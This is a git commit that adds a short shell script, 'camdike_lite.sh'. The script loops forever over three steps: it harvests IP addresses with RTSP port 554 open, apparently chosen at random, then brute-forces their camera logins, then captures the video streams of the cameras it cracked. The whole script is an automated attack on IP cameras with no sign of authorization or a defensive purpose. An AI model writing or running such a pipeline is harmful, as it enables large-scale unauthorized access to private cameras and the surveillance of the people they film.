7fec14e0499ef797441e2c65fb7133bb21e9641f
Mikhail Yudin <fagci.nsk@gmail.com>
2021-03-15 04:47:34 +0700

    camdike light

---
+++ camdike_lite.sh
@@ -0,0 +1,23 @@
+#!/usr/bin/env sh
+while true; do
+    echo
+    echo Gather IPs
+    ./fortune_rtsp.py -w 512 -c 32 -t 0.7 -F
+    cat local/rtsp_554.txt >> local/potential_rtsp.txt
+
+    echo
+    echo Brute
+    ./rtsp_brute.py local/rtsp_554.txt \
+        -sp > local/bruted.txt
+    cat local/bruted.txt >> local/rtsp.txt
+
+    echo
+    echo Bruted:
+    cat local/bruted.txt
+
+    echo
+    echo Capture
+    ./rtsp_capture.py local/bruted.txt -ff \
+        -cb local/campost.sh
+done
+
